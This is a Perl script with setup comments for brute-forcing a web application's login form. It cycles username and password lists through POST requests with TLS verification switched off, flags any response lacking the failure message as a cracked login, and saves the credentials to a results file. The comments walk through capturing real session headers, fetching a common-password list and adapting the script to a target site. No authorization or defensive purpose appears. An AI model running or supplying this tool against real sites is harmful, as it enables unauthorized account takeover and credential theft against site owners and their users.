# What you should do first: record the login to the webserver with some local proxy or a browser addon (firefox: firebug, tamper data etc.). Windows proxy: http://www.bindshell.net/tools/odysseus.html & Proxy Log: http://www.bindshell.net/tools/telemachus.html or some proxy like OWASP ZAP (https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project) Once you have an existing login dump you need to copy paste the raw header into a text file called "headers.txt". The header you used might look like this (copy it without the actual URL into text file):

#User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0
#Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
#Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
#Accept-Encoding: gzip, deflate
#Referer: https://sxxxxxx
#Cookie: PHPSESSID=injod23lpi137129ehd6mb99t1
#Connection: keep-alive
#Content-Type: application/x-www-form-urlencoded
#Content-Length: 53

# Next you need to create the user & password list. Download or create one on your own. MAybe consider using like the top 100 passwords (http://stricture-group.com/files/adobe-top100.txt)

# you find also a few things to adapt in the script. Mainly the POST variable names & values. If your server send e.g. some variable called "variableX" with the content "1234" just append 
#, 'variableX' => '1234' within the curly brackets at the end. If a login was cracked it writes it in the output file "results.txt". Have fun!

# If you need other scripts for doing similar tasks with GET requests, different web responses (e.g. analyse a http redirect 302 instead of a message in the body): drop me a line and i provide you with the script: oli.muenchow@gmail.com


use HTTP::Request::Common qw{ POST };
use warnings;
my %headers;
open FILE, "<", "headers.txt" or die;
while (<FILE>){
	chomp;
	if (/(.*?)\s*:\s*(.*)/){
		$headers{$1} = $2;
	}
}
close FILE;


open (DICT, "users.txt");
my @lines = <DICT>;
chomp @lines;  
foreach $line (@lines) 
{ 

open (PASSWORDS, "pwd.txt");
my @passwords = <PASSWORDS>;
chomp @passwords;
foreach $password (@passwords)
 
{
my $ua = LWP::UserAgent->new;
$ua->ssl_opts( verify_hostname => 0 ); 
$ua->timeout(10);

my $url = 'https://yourtargetdomain.com/index.php?Login'; # replace with the URL which is used for authentication

my $req = POST( $url, %headers, Content => [ 'username' => $line, 'password' => $password, 'doLogin' => 'login']); # replace the variables "username" and "password" with the variable names used with the login you try to crack. Add/replace other variables at the end according to your request.

# print "content = ".$req->content."\n"; # enable this for DEBUGGING to see the output of your request

my $response = $ua->request($req);
my $code = $response->code;


if ($response->decoded_content =~ "Wrong login data") # Replace "Wrong login data" with the error message the server gives you with a wrong login
                          
{print "Login with USER: $line and PASSWORD: $password failed! Server response code was: 	$code\n";
            next;
        }

        else
{print "$line with $password: OK\n";
        open RESULT, ">>results.txt";
        print RESULT "$line $password\n";
        close RESULT;
    }
 }
}
